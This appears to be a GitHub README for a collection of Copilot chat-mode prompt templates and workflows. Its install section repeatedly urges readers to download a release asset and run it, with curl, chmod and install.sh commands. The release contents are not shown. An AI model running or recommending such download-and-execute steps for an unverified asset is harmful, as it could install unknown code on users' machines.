https://github.com/Quannzo/copilot-chat-modes/releases

# Copilot Chat Modes: Planning, Implementation, Review, PRDs, Prompts

![Hero image](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?q=80&w=1600&auto=format&fit=crop)

[![Releases](https://img.shields.io/badge/Releases-v--latest-blue?style=for-the-badge&logo=github)](https://github.com/Quannzo/copilot-chat-modes/releases)

Short, practical collection of chat mode templates and workflows for GitHub Copilot chat. Use these modes to plan features, write implementation code, run code reviews, produce PRDs, and optimize prompts for LLMs and Copilot. The repo packs ready-made prompts, example workflows, VS Code tips, and automation hooks you can adapt to your team.

Tags: automation, chat-modes, code-review, copilot, copilot-chat, developer-tools, engineering-workflow, github-copilot, llm, planning, prd, product-management, productivity, prompt-engineering, software-architecture, vscode

Table of contents
- Features
- Why chat modes matter
- Mode reference
  - Planning mode
  - Implementation mode
  - Code review mode
  - PRD mode
  - Prompt optimization mode
- Quick start
- Releases and install
- VS Code and extension patterns
- Examples and ready prompts
- Workflow templates
- Configuration
- Tests and CI
- Contributing
- License

Features
- Focused chat templates for common engineering tasks.
- Prompts tuned for structure, context, and token efficiency.
- Example LLM settings for temperature, max_tokens, and system messages.
- Code review checklist items and automated comment templates.
- PRD skeletons tailored for engineering teams and product managers.
- VS Code snippets and commands to inject prompts into Copilot chat.
- A small CLI to run local prompt tests and format outputs.

Why chat modes matter
Chat modes give structure to interactions with an LLM. They reduce back-and-forth. They keep context consistent. They help teams scale Copilot chat across planning, dev, and review cycles. Use a mode when you start a new task. The mode sets the tone, constraints, and expected output format.

Mode reference

Planning mode
Goal: Define scope, deliverables, and a phased plan.

System role
- Act as an engineering lead and product partner.
- Ask clarifying questions.
- Deliver a 3-phase plan: discovery, build, launch.

Prompt template
- System: You are a planning assistant. Drive toward a clear scope and milestones.
- User: Provide feature idea, goals, and constraints.

Output format
- One-line summary
- Scope bullets
- Milestones with owners and timeboxes
- Risks and mitigation
- Open questions

Example use
- "Plan a dark-mode rollout for the settings page that supports persisted user preference."

Implementation mode
Goal: Convert design and plan into code skeletons and tasks.

System role
- Act as a senior engineer.
- Provide code snippets with file paths.
- Provide tests and CI hints.

Prompt template
- System: You are an implementation assistant. Produce code, tests, and a changelog entry.
- User: Paste the design and ask for a TypeScript React implementation and unit tests.

Output format
- Files to create
- Code blocks labeled with file names
- Unit tests
- Suggested review checklist

Example use
- "Implement the settings toggle, persist it to localStorage, and add unit tests."

Code review mode
Goal: Provide a structured, actionable review.

System role
- Act as a code reviewer focused on correctness, performance, security, and maintainability.
- Produce inline comments and summary block.

Prompt template
- System: You are a code reviewer. Use the repository style guide and evaluate changes.
- User: Provide diff or paste changed files.

Output format
- Summary (high/medium/low risk)
- Top 5 issues with severity and suggested fixes
- Inline comment examples in the PR format
- Test coverage suggestions

Example use
- "Review the following diff and provide inline comments and a PR summary."

PRD mode
Goal: Create a concise product requirements document that aligns engineering and PM.

System role
- Act as a product writer and technical reviewer.
- Ask for acceptance criteria and metrics.

Prompt template
- System: You are a PRD assistant. Produce sections for goal, scope, success metrics, UX, API, rollout, and risks.
- User: Provide the feature name and target audience.

Output format
- Title and one-line summary
- Problem statement and user impact
- Success metrics
- Requirements and open questions
- Release plan and metrics collection points

Example use
- "Write a PRD for in-app onboarding that reduces time-to-first-action."

Prompt optimization mode
Goal: Improve prompts for clarity, token cost, and model behavior.

System role
- Act as a prompt engineer.
- Offer alternative prompts, token estimates, and sampling settings.

Prompt template
- System: You are a prompt optimization agent. Return a simpler prompt, a compact system role, and token cost estimate.
- User: Paste your current prompt.

Output format
- Short optimized prompt
- System message suggestion
- Temperature and max_tokens recommendation
- Notes on where to include context vs. examples

Example use
- "Optimize this prompt for API use and reduce token cost."

Quick start
- Pick a mode.
- Use the mode template and paste your context.
- Add a system message and explicit output format.
- Iterate until the output matches your needs.

Releases and install
Visit the releases page for packaged assets and installers:
https://github.com/Quannzo/copilot-chat-modes/releases

This repo publishes release assets. Download the asset that matches your environment and execute it.

Example download pattern (replace placeholders with the actual release and asset name):
- Linux/macOS (example)
  - curl -L -o copilot-chat-modes.tar.gz "https://github.com/Quannzo/copilot-chat-modes/releases/download/vX.Y.Z/copilot-chat-modes-linux.tar.gz"
  - tar -xzf copilot-chat-modes.tar.gz
  - chmod +x ./copilot-chat-modes/install.sh
  - ./copilot-chat-modes/install.sh
- Windows (example)
  - Download the .zip from the Releases page and run the included installer or launch the included CLI exe.

If the release link does not work for you, check the Releases section on the repository page. The release assets include a small CLI used to run prompt tests and format outputs.

Releases badge
[![Download Releases](https://img.shields.io/github/downloads/Quannzo/copilot-chat-modes/total?style=for-the-badge)](https://github.com/Quannzo/copilot-chat-modes/releases)

VS Code and extension patterns
- Use Copilot chat inside VS Code to run modes.
- Create snippet files for each mode under .vscode/snippets to inject system and user messages.
- Map keys to open Copilot chat with pre-filled prompts using extension APIs or Tasks.

Snippet example (.vscode/snippets/planning.code-snippet)
- "system": "You are a planning assistant..."
- "body": ["%%MODE_PLANNING%%", "$1"]

Automation hooks
- CI can run prompt smoke tests on PRs using the included CLI.
- Add a GitHub Actions workflow that calls the local CLI to validate prompt outputs and ensure the mode templates still render cleanly.

Examples and ready prompts

Planning mode — template
System: You are a planning assistant. Organize the output into Summary, Scope, Milestones, Risks, Open Questions.
User: [paste feature notes]

Implementation mode — sample prompt for React
System: You are a senior React engineer. Provide code with filenames and tests.
User: "Build a SettingsToggle component with persistence and unit tests."

Code review mode — sample prompt
System: "You are a thorough code reviewer. Mark issues and provide fixes."
User: Paste diff or file contents.

Prompt optimization — sample prompt
System: "You are a prompt engineer. Reduce tokens and keep results robust."
User: Paste original prompt.

Workflow templates

Feature workflow (small teams)
1. Planning mode — produce scope and milestones.
2. PRD mode — fill the PRD skeleton.
3. Implementation mode — implement and include tests.
4. Code review mode — run auto review via CLI, then human review.
5. Merge and launch.

Large feature workflow (with staging)
1. Discovery (Planning mode)
2. Design review
3. Implementation sprints (Implementation mode + CI tests)
4. Staging review (Code review mode, performance focus)
5. Release and monitor.

Configuration
- modes.yaml holds templates and system messages.
- .copilot-chat-config.json stores per-user preferences like default temperature and max_tokens.
- Examples:
  - temperature: 0.1 for deterministic outputs
  - temperature: 0.3 for creative tasks like brainstorming
  - max_tokens: 1024 for long responses, 512 for compact answers

Tests and CI
- The repo includes prompt snapshot tests. The CLI runs prompts with a mock LLM and compares outputs to saved snapshots.
- Use GitHub Actions to run tests on each PR.
- The snapshot tests help catch regressions in prompt text or formatting.

Contributing
- Add or refine modes in modes/ with a YAML file and sample prompts.
- Add snippets for VS Code under vscode/.
- Add unit tests for prompt outputs under tests/.
- Open PRs against main. Use feature branches and include test updates.

Style guide for prompts
- Keep system messages short and explicit.
- Use numbered output formats for easier parsing.
- Put required fields first.
- Avoid large context dumps. Provide a short context block and link to documents when needed.
- Use examples to show the exact output you expect.

Useful tips
- Use temperature 0.0–0.2 for code, tests, and PRDs.
- Use structured formats like JSON or markdown tables when you need machine-parseable output.
- Keep prompts under 2–3k tokens for reliable behavior.
- Add a brief "Context:" section for large projects and a "Constraints:" section for limits.

Contact and links
- Releases: https://github.com/Quannzo/copilot-chat-modes/releases
- Use the Releases page to download installer assets or the CLI.

Assets and images
- Hero image: Unsplash (programming workspace)
- Badges: img.shields.io

Files and layout (what to expect)
- modes/ — YAML templates for each chat mode
- vscode/ — snippets and example keybindings
- cli/ — small CLI for running prompt tests and formatting
- tests/ — snapshot tests for prompts
- docs/ — extended mode documentation and examples

License
- MIT

Acknowledgments
- Ideas come from common Copilot chat patterns used in engineering teams and product groups.
- The mode structure draws on classic PRD and code review best practices.

